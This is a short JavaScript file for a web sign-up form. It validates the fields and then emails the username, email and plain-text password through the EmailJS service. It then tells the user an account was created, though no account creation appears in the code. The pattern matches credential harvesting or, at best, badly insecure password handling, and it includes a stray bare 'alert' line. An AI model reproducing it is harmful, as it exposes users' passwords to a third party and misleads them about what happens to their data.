document.addEventListener("DOMContentLoaded", function() {
	emailjs.init("6mvqxpJacenV0vkKC");
    const form = document.getElementById("create-account-form");
    const usernameInput = document.getElementById("username");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");

    form.addEventListener("submit", function(event) {
        event.preventDefault();

        // Basic validation
        if (usernameInput.value.trim() === "") {
            alert("Please enter your username.");
            usernameInput.focus();
            return;
        }

        if (emailInput.value.trim() === "") {
            alert("Please enter your email.");
            emailInput.focus();
            return;
        }

        if (passwordInput.value.trim() === "") {
            alert("Please enter your password.");
            passwordInput.focus();
            return;
        }

        const accountData = {
            from_name: usernameInput.value,
            email: emailInput.value,
            password: passwordInput.value
        };
		alert
        // Send email using EmailJS
        emailjs.send("service_9c0nymt", "template_yahnwyg", accountData)
            .then(function(response) {
                console.log('SUCCESS!', response.status, response.text);
                alert("Account created successfully!");
                form.reset();
            }, function(error) {
                console.log('FAILED...', error);
                alert("An error occurred while creating the acount.");
            });
    });
});